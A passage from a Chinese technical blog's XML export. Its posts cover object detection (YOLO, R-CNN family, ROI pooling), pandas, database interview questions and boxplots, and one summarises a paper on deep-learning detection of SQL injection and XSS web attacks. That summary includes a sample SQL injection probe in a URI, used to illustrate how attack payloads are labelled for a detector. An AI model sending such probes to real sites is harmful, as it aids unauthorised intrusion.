p.requires_grad, model.parameters()), lr=1e-3)]]></content>
      <tags>
        <tag>深度学习</tag>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[目标检测——yolo算法实现]]></title>
    <url>%2F2019%2F11%2F05%2F%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94yolo%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[​ 本文主要针对yolo模型的实现细节进行一些记录，前半部分不讨论yolo模型，直接将yolo模型当做黑盒子进行使用，讨论模型外的预处理以及输出表现等部分。 Yolo外部关键点1.boxes阈值过滤​ 该部分主要用于将对各个boxes进行打分，根据阈值对boxes进行过滤。 12345678def yolo_filter_boxes(box_confidence, boxes, box_class_probs, threshold = .6): box_scores = box_confidence*box_class_probs #boxes分数为置信度*类别概率 box_classes = K.argmax(box_scores,-1) box_class_scores = K.max(box_scores,-1) filtering_mask = box_class_scores&gt;threshold scores = tf.boolean_mask(box_class_scores,filtering_mask) boxes = tf.boolean_mask(boxes,filtering_mask) classes = tf.boolean_mask(box_classes,filtering_mask) bbox信息（x,y,w,h）为物体中心位置相对于格子位置的偏移、高度和宽度，均被归一化 置信度反映了是够包含物体以及包含物体情况下的为位置准确性，定义为]]></content>
  </entry>
  <entry>
    <title><![CDATA[目标检测——常见目标检测算法]]></title>
    <url>%2F2019%2F10%2F27%2F%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%B8%B8%E8%A7%81%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;本文从整体上对目标检测算法做了概述，首先对目前目标检测算法的主要流派做阐述，然后针对传统目标检测算法以及新兴的候选区域+深度学习方式两种方式的主流目标检测算法分别做比较详细介绍。 1.回归+分类双头网络&emsp;&emsp;将问题看做回归问题，预测出方框的坐标值。 &emsp;&emsp;基本的处理流程 1.先搭建一个图像识别任务的卷积神经网络(CNN+full connected) ​ 2.将上面搭建好的卷积神经网络进行的尾部与全连接分类网络并行的加入一个新的回归分类网络，形成classfication+regession模式 3.加入回归头后对regession部分采用欧式距离损失使用SGD进行训练 由于regession很难进行训练，因此网络采取classfication的网络来计算出classfication head和regression head的共同的连接权值，然后前面的部分保持参数不变，只训练regession head部分的连接的权值(这里是第一次fine-tune) 4.预测阶段，两个头同时完成图像识别和定位的工作 2.候选区域+深度学习two-stage模型&emsp;&emsp;two-stage模型与传统的目标检测算法、人们的认知方式比较接近，即首先采用 (一) R-CNN​ R-CNN模型即使用Region Proposal + CNN代替传统目标检测使用的滑动窗口+手工设计特征，首先在途中找出目标可能会出现的位置，即候选区域(Region Proposal)，可以保证在选取较少（几千甚至几百）的窗口的前提下保持较高的召回率。核心包括： 1.区域选择算法 ​ 常见的选择性搜索算法主要有Selective Search和EdgeBoxs。 2.CNN特征提取网络 3. R-CNN整体流程​ 1.输入测试图像 ​ 2.利用Selective Search算法从图像中从下到上提取2000个左右的可能包含物体的候选区域(各个候选区域的大小可能不同)，将各个候选区域缩放成统一的大小并输入到CNN网络中进行特征提取。 ​ 3.将CNN网络中提取到的特征输入到SVM中进行分类 R-CNN具体步骤 1.首先训练一个分类模型。 ​ 例如训练一个TextCNN模型 2.对该模型做finue-tuning ​ 去除原有全连接层 3.候选框选择 ​ 使用Selective Search算法进行候选框选择 4.对于每一个候选区域大小进行修正（统一大小）输入到前面训练好的CNN网络中，做一次前向运算，将卷积层提取到的特征存储到硬盘。 5.使用第四步存储的各个候选框的特征训练一个SVM模型，来判断去区域中的物体是否为该类 6.使用回归器调整候选框位置。 ​ 对于每一个类，训练一个线性回归模型去判定这个框是否框得完美。 R-CNN存在的问题 ​ 对原始图片通过Selective Search提取的候选框region proposal多达2000个左右，而这2000个候选框每个框都需要进行CNN提特征+SVM分类，计算量很大 ​ (二) SSP Net​ SSP Net全称Spatial Pyramid Pooling Net（空间金字塔池化网络） 1.主要改进点 1.提出ROI池化层。 ​ 可以保证不同大小的输入到CNN部分，输出大小相同的向量可以直接输入到一个全连接网络。 2.只对原图进行一次卷积特征提取。 2.ROI池化层​ 众所周知，CNN一般都含有卷积部分和全连接部分，其中，卷积层不需要固定尺寸的图像，而全连接层是需要固定大小的输入。所以一般在不同大小的数据输入到全连接网络之前一般都需要对数据进行crop（切割）或者warp(增大)到同一尺寸，才能输入到CNN网络中，但是采用这种处理方式将会到导致的问题是要么拉伸变形、要么数据不全，大大影响了识别的准确率。 ​ 既然由于全连接FC层的存在，普通的CNN需要通过固定输入图片的大小来使得全连接层的输入固定。那借鉴卷积层可以适应任何尺寸，为何不能在卷积层的最后加入某种结构，使使得后面全连接层得到的输入变成固定的呢？ 作用:使CNN网络的输入可以是任意尺度的，在SPP layer中每一个pooling的filter会根据输入调整大小，而SPP的输出则是固定维数的向量，然后给到全连接FC层。 具体流程 假设输入ROI Pooling层的feature map of conv5的shape是(h,w,c) 首先ROI Pooling层把feature map of conv5划分成4*4的小方块(对应图中蓝色矩形),每个小方块的宽高分别为w/4,h/4,通道数为c,不能整除时需要取整.针对feature map的每个通道,分别在这16个小方块进行最大池化(MaxPooling),也就是取出小方块里的最大值.每一个通道都能取出16个最大值,所以所有通道共有16c个值 然后ROI Pooling层把feature map of conv5划分成2*2的小方块(对应图中绿色矩形),使用同样的方法得到4c个值 接着ROI Pooling层把feature map of conv5划分成1*1的小方块(对应图中灰色矩形),得到c个值 最后将上面三个值串联起来得到长度为16c+4c+c=21c的特征表示 3.只对原图进行一次卷积​ 针对R-CNN中每个候选框都要单独输入到CNN中，这样做十分低效的缺陷，SSP Net针对这个缺陷做了优化： ​ 只对原图进行一次卷积运算，得到整张图的feature map，然后找到每个候选框在 feature map上的映射的patch，然后将每个候选框对应的patch卷积特征输入到SSP layer之后的层，完成特征提取工作。 速度比R-CNN方式提升了100倍 (三) Fast R-CNN​ Fast R-CNN的实质就是在R-CNN的基础上增加了SSP Net的方法 与R-CNN框架相比的完善点： 1.卷积层后面加入了一个ROI Pooling层 2.损失函数使用了多任务损失函数，将边框回归直接加入到CNN网络中进行训练 边框回归 1.加入ROI pooling层​ ROI pooling layer实际上是SPP-NET的一个精简版，SSP-NET对每个proposal使用了不同大小的金字塔映射，而ROI pooling layer只需要下采样到一个7x7的特征图。对于VGG16网络conv5_3有512个特征图，这样所有region proposal对应了一个7*7*512维度的特征向量作为全连接层的输入。 2.将边框回归直接加入到了网络中，实现端到端​ 之前的R-CNN框架是分为提取proposl、CNN提取特征、SVM分类器分类这种割裂开的三个阶段，而Fast R-CNN直接使用softmax替代SVM分类，同时利用多任务损失函数边框回归也加入到了网络中，这样整个的训练过程是端到端的(除去region proposal提取阶段)。 3.R-CNN和Fast R-CNN对比： R-CNN:许多候选框（比如两千个）—&gt;CNN—&gt;得到每个候选框的特征—&gt;分类+回归 Fast R-CNN：一张完整图片—&gt;CNN—&gt;得到每张候选框的特征—&gt;分类+回归 ​ Fast R-CNN相对于R-CNN的提速原因就在于：不过不像R-CNN把每个候选区域给深度网络提特征，而是整张图提一次特征，再把候选框映射到conv5上，而SPP只需要计算一次特征，剩下的只需要在conv5层上操作就可以了。 4.存在问题​ 虽然不在不再需要对每个候选框进行卷积运算，但是使用选择搜索算法进行候选框生成的过程也非常耗时。 （四）Faster R-CNN核心 ​ 引入Region Proposal Network(RPN)替代Selective Search，同时引入anchor box应对目标形状的变化问题 RPN​ 首先在feature map上进行滑动的窗口，]]></content>
      <tags>
        <tag>深度学习</tag>
        <tag>目标检测</tag>
        <tag>图像</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[目标检测——ROI池化层]]></title>
    <url>%2F2019%2F10%2F27%2F%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94ROI%E6%B1%A0%E5%8C%96%E5%B1%82%2F</url>
    <content type="text"><![CDATA[​ RoI概念来源于SPP Net网络，其主要用于改善在卷积神经网络一般都包含卷积部分和全连接部分两个部分，卷积神经网络部分输入不需要固定尺寸，而全连接层则需要固定输入尺寸，因此在卷积神经网络中由于卷积部分提取到到的特征向量要输入到全连接网络中，因此卷积网络部分的的输入也只能输入固定的尺寸，但是在一些环境中所能提供的输入并不是一定的，因此在SSP Net中提出了RoI结构用来解决这个问题。 作用 ​ 加在卷积层后用来将卷积层输出的不同尺寸的向量固定成一个尺寸，使其可以在模型原始输入向量大小不同时可将卷及部分输出的向量统一规格输入到后续的全连接部分。 具体结构 假设输入ROI Pooling层的feature map of conv5的shape是(h,w,c) 首先ROI Pooling层把feature map of conv5划分成4*4的小方块(对应图中蓝色矩形),每个小方块的宽高分别为w/4,h/4,通道数为c,不能整除时需要取整.针对feature map的每个通道,分别在这16个小方块进行最大池化(MaxPooling),也就是取出小方块里的最大值.每一个通道都能取出16个最大值,所以所有通道共有16c个值 然后ROI Pooling层把feature map of conv5划分成2*2的小方块(对应图中绿色矩形),使用同样的方法得到4c个值 接着ROI Pooling层把feature map of conv5划分成1*1的小方块(对应图中灰色矩形),得到c个值 最后将上面三个值串联起来得到长度为16c+4c+c=21c的特征表示]]></content>
      <tags>
        <tag>深度学习</tag>
        <tag>目标检测</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[目标检测——基本知识]]></title>
    <url>%2F2019%2F10%2F26%2F%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1.什么是IoU(intersection-over-union)？ IoU简单来讲就是模型产生的目标窗口和原来标记窗口的交叠率。具体计算公式为：]]></content>
  </entry>
  <entry>
    <title><![CDATA[目标检测——SelectiveSearch]]></title>
    <url>%2F2019%2F10%2F26%2F%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E2%80%94%E2%80%94SelectiveSearch%2F</url>
    <content type="text"><![CDATA[https://blog.csdn.net/Tomxiaodai/article/details/81412354]]></content>
      <tags>
        <tag>深度学习</tag>
        <tag>目标检测</tag>
        <tag>图像</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ddos]]></title>
    <url>%2F2019%2F10%2F20%2Fddos%2F</url>
    <content type="text"><![CDATA[https://www.cnblogs.com/bonelee/p/9204826.html]]></content>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pandas列表存储被自动转换成字符串问题]]></title>
    <url>%2F2019%2F10%2F17%2Fpandas%E5%88%97%E8%A1%A8%E5%AD%98%E5%82%A8%E8%A2%AB%E8%87%AA%E5%8A%A8%E8%BD%AC%E6%8D%A2%E6%88%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[问题描述: ​ 在数据分析过程中发现当某一列的值为列表类型时，当存储成为csv时将自动将该列的列表存储成为对应的字符串，当重新进行读取时只能按照字符串进行处理。下面是一个真实的事例： ​ 首先直接创建一列数据类型为list，直接查看dataframe中存储的数据，发现还是正常的列表类型 123456&gt;&gt;&gt; df = DataFrame(columns=['col1'])&gt;&gt;&gt; df.append(Series([None]), ignore_index=True)&gt;&gt;&gt; df['column1'][0] = [1, 2]&gt;&gt;&gt; df col10 [1, 2] ​ 然后将dataframe进行存储后进行读取，这里可以看到列表列已经变成了字符串类型： 1234&gt;&gt;&gt; df.to_csv("XXX.csv")&gt;&gt;&gt; df = pd.read_csv("XXX.csv")&gt;&gt;&gt; df['column1'][0]'[1, 2]' 解决方案： ​ 1.存储时不再存储为csv，存储为pickle文件 1234567&gt;&gt;&gt; import pickle&gt;&gt;&gt; with open("data.pkl",'wb') as file:&gt;&gt;&gt; pickle.dump(df,file)&gt;&gt;&gt; with open('tmp.pkl', 'rb') as file:&gt;&gt;&gt; new_df =pickle.load(file)&gt;&gt;&gt; new_df['col1'][0][1, 2] ​ 2.存储后将ast.literal_eval从str转化会list 123&gt;&gt;&gt; from ast import literal_eval&gt;&gt;&gt; literal_eval('[1.23, 2.34]')[1.23, 2.34]]]></content>
      <tags>
        <tag>数据分析</tag>
        <tag>pandas</tag>
        <tag>常见问题</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F10%2F13%2F%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[2019.10.13​ 1.大数据安全模型效果的提升主要可以从两方面进行着手，一方面是拿到典型集的样本，这是非常困难的。另一方面，通过数据建模将问题转化为搜索问题，例如数据驱动进化算法，直接穷举所有可行解。 ​ 2.数据驱动算法：https://zhuanlan.zhihu.com/p/36212065 ​ 3.数据降维的新算法:UMAP(Uniform Manifold Approximation and Projection,统一流形逼近与投影),和在数据量较大的数据集上t-SNE相比具有很大的竞争力。]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据库相关总结]]></title>
    <url>%2F2019%2F10%2F09%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[1.什么是存储过程？优点是什么？​ 存储过程是一些预编译的SQL语句。 ​ 优点：1.更加容易理解 ​ 2.存储过程是一个预编译的代码模块，执行效率更高 2.索引是什么？有什么作用以及优缺点？​ 索引是对数据库表中一或多个列的值进行排序的结构，是帮助MySQL高效获取数据的数据结构 ​ 注意：所以需要占用物理和数据空间 ​ 作用:1.加快数据库检索速度 ​ 2.降低了插入、删除、修改等维护任务的速度 ​ 3.唯一索引可以确保每一行数据的唯一性 ​ 4.通过使用索引，可以在查询的过程中使用优化隐藏器，提高系统的性能 ​ 建立索引的原则：在使用最频繁的、需要排序的字段上建立索引 3.什么是事务？​ 事务（Transaction）是并发控制的基本单位。所谓的事务，它是一个操作序列，这些操作要么都执行，要么都不执行，它是一个不可分割的工作单位。事务是数据库维护数据一致性的单位，在每个事务结束时，都能保持数据一致性。 事务的特性： ​ (1）原子性：即不可分割性，事务要么全部被执行，要么就全部不被执行。 ​ （2）一致性或可串性。事务的执行使得数据库从一种正确状态转换成另一种正确状态 ​ （3）隔离性。在事务正确提交之前，不允许把该事务对数据的任何改变提供给任何其他事务， ​ （4） 持久性。事务正确提交后，其结果将永久保存在数据库中，即使在事务提交后有了其他故障，事务的处理结果也会得到保存。 4.使用索引查询一定能提高查询的性能吗？为什么？​ 通常索引查询要比全表扫描速度要快，但是也存在特殊情况： ​ 索引需要空间来存储,也需要定期维护, 每当有记录在表中增减或索引列被修改时,这意味着每条记录的INSERT,DELETE,UPDATE将为此多付出4,5 次的磁盘I/O，因为索引需要额外的存储空间和处理,那些不必要的索引反而会使查询反应时间变慢. 5.drop、delete与truncate的区别​ 1.效果上：delete和truncate只删除表的数据不删除表的结构 ​ 2.速度上：drop&gt; truncate &gt;delete ​ 3.操作类型：delete是dml,这个操作要放到rollback segment中，事物提交后才生效，如果有相应的trigger，执行时将被触发。truncated、drop是ddl，操作立即生效，但不能进行回滚，操作不触发trigger ​ 使用场景: ​ 1.不需要一张表时，用drop ​ 2.删除部分数据行时，用delete+where子句 ​ 3.保留表而删除所有数据时，用truncate 6.超键、候选键、主键、外键分别是什么？​ 超键：在关系中能唯一表示元组属性集称为关系模式的超键。一个属性获多个属性的组合都可以作为超键。超键包含候选键和主键。 ​ 候选键：最小的超键，没有冗余元素的超键。 ​ 主键：数据库表中对存储数据对象予以唯一完整标识的数据列或属性组合。一个数据列只能有一个主键，并且逐渐的值不能为NULL ​ 外键：在一个表中存在另一个表的主键称为词表的外键。 7.什么是视图？以及视图的使用场景有哪些？​ 视图是一种由一个或多个真实表的行或者列组成的虚拟的表，具有和物理表相同的功能。可以对视图进行增，改，查，操作，对视图的修改不影响基本表。 ​ 使用场景：1.希望只暴露部分字段给访问者，可以使用视图 ​ 2.查询的数据来源于不同的表，而查询者希望以一种统一的方式查询，可以使用视图 8.乐观锁和悲观锁​ 数据库管理系统（DBMS）中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。乐观并发控制(乐观锁)和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。 悲观锁：假定会发生并发冲突，屏蔽一切可能违反数据完整性的操作 乐观锁：假设不会发生并发冲突，只在提交操作时检查是否违反数据完整性。 9、说一说三个范式。​ 第一范式（1NF）：数据库表中的字段都是单一属性的，不可再分。这个单一属性由基本类型构成，包括整型、实数、字符型、逻辑型、日期型等。 ​ 第二范式（2NF）：对记录的惟一性约束，要求记录有惟一标识，即实体的惟一性； ​ 第三范式（3NF）：对字段冗余性的约束，即任何字段不能由其他字段派生出来，它要求字段没有冗余 优势： ​ 可以尽量减少冗余，使的更新更快、体积更小 10.什么是触发器（trigger）？Mysql中都有哪些触发器？​ 触发器是指一段代码，当触发某个事件时，自动执行这些代码，提供给程序员和数据分析员来保证数据完整性的一种方法，它是与表事件相关的特殊的存储过程。。 ​ 在mysql中一共有6中触发器： ​ 1.Before Insert ​ 2.After Insert ​ 3.Before Update ​ 4.After Update ​ 5.Before Delete ​ 6.After Delete 11.常见mysql表引擎​ InnoDB、MyISAM、Memory 12.关系数据库和非关系型数据库关系型数据库​ 关系型数据库最典型的数据结构是表，由二维表及其之间的联系所组成的一个数据组织 代表: ​ Oracle、SQL Server、Access、Mysql 优点： 1、易于维护：都是使用表结构，格式一致； 2、使用方便：SQL语言通用，可用于复杂查询； 3、复杂操作：支持SQL，可用于一个表以及多个表之间非常复杂的查询。缺点： 1、读写性能比较差，尤其是海量数据的高效率读写； 2、固定的表结构，灵活度稍欠； 3、高并发读写需求，传统关系型数据库来说，硬盘I/O是一个很大的瓶颈。 非关系型数据库​ 非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。 代表： ​ Hbase key-value形式 ​ Redis key-value形式 ​ MongodDB key-value形式 ​ Neo4j 图形数据库 优点： 1、格式灵活：存储数据的格式可以是key,value形式、文档形式、图片形式等等，文档形式、图片形式等等，使用灵活，应用场景广泛，而关系型数据库则只支持基础类型。 2、速度快：nosql可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘； 3、高扩展性； 4、成本低：nosql数据库部署简单，基本都是开源软件。 缺点： 1、不提供sql支持，学习和使用成本较高； 2、无事务处理； 3、数据结构相对复杂，复杂查询方面稍欠。 13.CHAR和VARCHAR的区别​ 1.char和varchar类型在存储和检索方面有所不同 ​ 2.char列长度固定为创建声明时生命的长度，长度范围是1到255，当char值被存储时，他们被用空格填充到指定长度，检索char值时要删除尾随空格 14.如果一个表有一列定义为TIMESTAMP，将发生什么？​ 每当行被更改时，时间戳字段都会获取当前时间戳 15.什么是内连接、外连接、自连接？​ 内连接 则是只有条件的交叉连接，根据某个条件筛选出符合条件的记录，不符合条件的记录不会出现在结果集中，即内连接只连接匹配的行。​ 外连接 其结果集中不仅包含符合连接条件的行，而且还会包括左表、右表或两个表中的所有数据行，这三种情况依次称之为左外连接，右外连接，和全外连接。 ​ 左外连接，也称左连接，左表为主表，左表中的所有记录都会出现在结果集中，对于那些在右表中并没有匹配的记录，仍然要显示，右边对应的那些字段值以NULL来填充。右外连接，也称右连接，右表为主表，右表中的所有记录都会出现在结果集中。左连接和右连接可以互换，MySQL目前还不支持全外连接。 16.SQL语言包括哪几部分？每部分都有哪些操作关键字？SQL语言包括数据定义(DDL)、数据操纵(DML),数据控制(DCL)和数据查询（DQL）四个部分。 ​ 数据定义：Create Table,Alter Table,Drop Table, Craete/Drop Index等 ​ 数据操纵：Select ,insert,update,delete, ​ 数据控制：grant,revoke ​ 数据查询：select 17.完整性约束包括哪些？数据完整性(Data Integrity)是指数据的精确(Accuracy)和可靠性(Reliability)。 分为以下四类： ​ 1) 实体完整性：规定表的每一行在表中是惟一的实体。 ​ 2) 域完整性：是指表中的列必须满足某种特定的数据类型约束，其中约束又包括取值范围、精度等规定。 ​ 3) 参照完整性：是指两个表的主关键字和外关键字的数据应一致，保证了表之间的数据的一致性，防止了数据丢失或无意义的数据在数据库中扩散。 ​ 4) 用户定义的完整性：不同的关系数据库系统根据其应用环境的不同，往往还需要一些特殊的约束条件。用户定义的完整性即是针对某个特定关系数据库的约束条件，它反映某一具体应用必须满足的语义要求。 ​ 与表有关的约束：包括列约束(NOT NULL（非空约束）)和表约束(PRIMARY KEY、foreign key、check、UNIQUE) 。 18.什么是锁？​ 数据库是一个多用户使用的共享资源。当多个用户并发地存取数据时，在数据库中就会产生多个事务同时存取同一数据的情况。若对并发操作不加控制就可能会读取和存储不正确的数据，破坏数据库的一致性。 ​ 基本锁类型：行级锁和表级锁 19.NULL是什么？]]></content>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化之箱型图]]></title>
    <url>%2F2019%2F09%2F17%2F%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96%E4%B9%8B%E7%AE%B1%E5%9E%8B%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[箱型图​ 箱线图（Boxplot）也称箱须图（Box-whisker Plot），它是用一组数据中的最小值、第一四分位数、中位数、第三四分位数和最大值来反映数据分布的中心位置和散布范围，可以粗略地看出数据是否具有对称性。通过将多组数据的箱线图画在同一坐标上，则可以清晰地显示各组数据的分布差异，为发现问题、改进流程提供线索。 箱型图有哪些作用呢？1.为了反映原始数据的分布情况，比如数据的聚散情况和偏态 ​ 从图中我们可以直观地看出，箱形图的中位数和上四分位数的间距比较窄的话，对应曲线图，这个间距内的数据比较集中，还有就是箱形图的上（下）边缘比较长的话，对应曲线图，尾巴就比较长。 2.异常值检测，在上下边缘之外的一般认为是异常值(这个和正太分布有关) 3.可以直观的比较多组数据 ​ 从这图我们可以很直观地看出以下信息：1.各科成绩中，英语和西方经济学的平均成绩比较高，而统计学和基础会计学的平均成绩比较低。（用中位数来衡量整体情况比较稳定） 2.英语、市场营销学、西方经济学、计算机应用基础和财务管理成绩分布比较集中，因为箱子比较短。而经济数学、基础会计学和统计学成绩比较分散，我们可以对照考试成绩数据看看也可以证实。 3.从各个箱形图的中位数和上下四位数的间距也可以看出，英语和市场营销学的成绩分布是非常的对称，而统计学呢？非常的不平衡，大部分数据都分布在70到85(中位数到上四分位数)分以上。同样，也可以从成绩单里的数据证实 4.在计算机应用基础对应的箱形图出现了个异常点，我们回去看看成绩单，计算机那一栏，出现了个计算机大牛（真希望是我），考了95分，比第二名多了10分。而其他同学的成绩整体在80分左右。 5。其实我们也可以从中得知，用平均值去衡量整体的情况有时很不合理，用中位数比较稳定，因为中位数不太会收到极值的影响，而平均值则受极值的影响很大。 如何做箱型图​ 用到的主要模块：matplotlib,pandas,numpy ​ 输入数据格式：单个数值列表，例如[1,3,1,5,4] ​ 核心参数: x:输入数据一列数据或者一个列的数组 labels:各个箱型子图的标签 whis:上下边缘强制定义，决定了哪部分部署被定义为异常数据，默认值为1.5。上边缘：第一和第三个四分位数。也就是说，IQR是四分位范围(‘ Q3-Q1 ‘)，上边缘须将延伸至最后一个数据小于’ Q3 + whisIQR ‘)。例如上四分位数为70，下四分位数为10，那么上边缘值为70+1.5\(70-10)=160 实战12plt.boxplot(x=[df[['parameters_max_len']].values,df[df['label']==0]['parameters_max_len'].values,df[df['label']==1]['parameters_max_len'].values],labels=['all sample','normal sample','black sample'],whis=2)plt.show()]]></content>
      <tags>
        <tag>数据分析</tag>
        <tag>可视化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里2019年最新论文-定位然后检测恶意攻击]]></title>
    <url>%2F2019%2F09%2F04%2F%E9%98%BF%E9%87%8C2019%E5%B9%B4%E6%9C%80%E6%96%B0%E8%AE%BA%E6%96%87-%E5%AE%9A%E4%BD%8D%E7%84%B6%E5%90%8E%E6%A3%80%E6%B5%8B%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[论文名称:《Locate-Then-Detect: Real-time Web Attack Detection via Attention-basedDeep Neural Networks》 主要针对的攻击类型:sql、xss 采用的方式:先定位攻击载荷在进行恶意检测 内容解读： ​ 主要分为两阶段网络 PLN(Payload Locat-ing Network):在整个url、post中定位到关键部分，去掉无用信息 PCN(Payload Classification Network):利用PLN网络得到的关注度信息进行分类 PLN​ 目标： ​ 输入:固定长度的请求输入文本 ​ 输出:区域位置和可疑置信度 ​ 核心思想：图像分割的思想 PLN网络要进行单独的训练，然后加到PCN网络之前，固定参数值(我的理解) request请求编码​ 首先设置一个最大长度L，然后进行字符级别的embedding，即每个字符都转化成一个对应的k维Embbeding向量，最终输出为：L*K维向量 这里的最大长度法和我们之前的方法类似，直接进行长度限制，忽略了在超长的正常参数尾部追加恶意payload形式的攻击 特征提取​ 模型：Xception Xception模型 ​ 先进行普通卷积操作，再对 1×1 卷积后的每个channel分别进行 3×3 卷积操作，最后将结果 concat ​ 加速计算：thin feature maps with small channel(不损失很大精度的前提下显著提升速度) 模型部分​ 沿着特征图滑动几个mini-networks来检测可以片段，该网络采样特征图一个nm的窗口，在mini-network层之后经过两个1\m并列的层——区域回归层和区域分类层 为了保证保持嵌入张量中这些向量的语义完整性，我们令m等于字符向量的嵌入大小。 reg层输出坐标：(p,2p)有效载荷的开始位置和结束位置 cls层：输出每个区域的得分 对于输入特征图为WH的，将会有H\P个区域 并不是所有区域都是有效的， 区域的标注区域标注为积极标签的方法为: 1.将用于最大的交集序列（Ios）的区域标为积极 2.将交集序列的值（Ios）大于0.5的值定位积极 区域标注为消极标签: 将交集序列的值小于0.2的标为消极序列 ​ 如果既没有标为消极也没有标为积极，那么则忽略该区域。一般情况下消极区域的数量远大于积极区域，如果消极区域和积极区域的比例大于3：1，那么将其归置到3：1。 PLN层的损失函数： ​ 参数意义： i：区域的编号 li:区域的label，积极区域为1，否则为0 posi、pos∗i :分别代表了区域的开始位置和结束位置 Lcls：是区域的分类对数损失函数， Lreg: 是积极区域的回归损失函数，不关注负样本，该回归损失函数采用： ​ x表示区域真实标签和预测值之间的差距 λ：控制损失函数的前后两个部分的重要性，本文中采用的是1.0 Ncls: 本文中设置为mini-batch 大小 Nreg:本文设置为区域个数， 数据标注​ 在整个LTD模型结构中，需要大量的标注数据，本文提出了基于HMM的异常检测系统来辅助序列标注，该系统通过大量的HMM模型来实现，每个host的每个url的参数值都会训练一个hmm模型，检测到的异常参数经过规则检测系统确定为xss或sql会标记起始和结束位置。 ​ 作用:表示有效payload位置 ​ 方法：参数hmm+规则系统 实例： ​ uri1 = /a.php?id=1&amp;name=1’ and 1=1 首先提取各个参数的值，得到 ​ {val1 : 1, val2 : 1′ and 1 = 1} 使用hmm参数异常检测模型确定是否存在异常参数值 ​ val2是异常的参数值 使用规则模型判别该参数为sql注入，定位位置，标记异常区域 ​ [Start (17), End (27), Label (1)] PCN​ 目标:对PLN层定位的可疑区域，在PCN部分进行深入的分析，找到攻击的区域， ​ 输入：PLN中得分最高的三个区域(最可疑) ​ 输出: 是否为攻击以及攻击类型 ​ 核心思想：采用CNN进行文本分类 具体做法 采用5层不同大小的卷积核，并且每个卷积核后都会带一个max-overtime pooling operation ，不同的卷积核大小保证了PCN能够精确地识别具有多种特征的攻击。这些特征被连接起来，在连接在层线性层，最后使用softmax输出是各种攻击的可能性 损失函数​ PCN部分的损失函数就是标准的交叉熵损失函数加上一个L1正则化项： 该层主要是一个文本分类的层，和PCN层共享相同的Embedding向量，输出给定区域是否为恶意以及攻击类型 数据产生方法 1.首先使用传统的WAF找出正常流量 2.构造sql、xss的payload参数值随机换到正常流量的参数值部分 实验结果1.CSCI​ CSCI 2010数据集包含针对电子商务Web应用程序生成的流量，该数据集包含25,000多个异常请求和36,000个良性请求，使用其中2,072 SQLi和1,502 XSS样本作为黑样本，其他的正常流量和攻击流量统一标记为白样本。 ​ LTD与RWAF相比，在精确率吧和召回率方面均要好。LTD和Libinjection都具有100%的精确率，但是LTD拥有更高的召回率。 2.真实流量数据来源 ​ 300w条真实流量数据，其中包括38600个sql注入和xss攻击实例。 Part 1 模型优越性的证明 ​ 其中， ​ 1.LTD获得了最高的精确率，HMM-Web获得了最高的召回率，但是它的误报率过高，在在真实的WAF应用中，误报率必须少于0.01%。 ​ 分析：在该实验中，HMM-Web方式之所以比LTD获得了更加高的准确率，是因为HMM-Web所采用的方式是基于异常检测的方式，只要是之前没有见过的流量都会被判别为恶意。但这种HMM异常检测的缺陷也非常的明显，每当有系统更新时，HMM-web模型都需要重新进行训练，因此HMM-web并不是一个很好的实时web入侵检测方式。 对于对于Web攻击检测，在误报和召回之间存在权衡，而低误报是生产环境中的先决条件。因为高误报会造成用户正常访问的阻塞 ​ 2.Libinjection和LTD都获得了100%的精确率，但LTD的召回率达到了99.8%，而Libinjection只有71%。下面是一些Libinjection误分类而LTD分类正确分类的样本： ​ 分析：这里的解释有点没太看懂，好像有点和上表对不上，大致意思是说Libinjection过分依赖指纹库，进行微小的改变都很难进行检测，而且由于有些正常流量可能偶尔也会出现指纹库中的部分内容，因此很容易误报 ​ 3.LTD比RWAF方式准确率和召回率都好。 Part2 PLN部分有效性的证明实验组1：LTD 实验组2 ：VPCN,把url参数部分却分为key-value形式，LTD去掉PLN部分只留下PCN部分进行分类 个人看法：这里我个人觉得对比试验有点问题，因为直接用PCN部分进行分类不一定非要进行参数切分，因此这里使用切与不切分进行对比，证明LTD效率更高个人认为不成立，应该使用直接使用PCN进行对原始embedding后的内容进行分类 1.效率上 ​ 在有GPU的的环境下，带PLN的网络比不带的快6倍，没有GPU的环境下快了8倍。 ​ 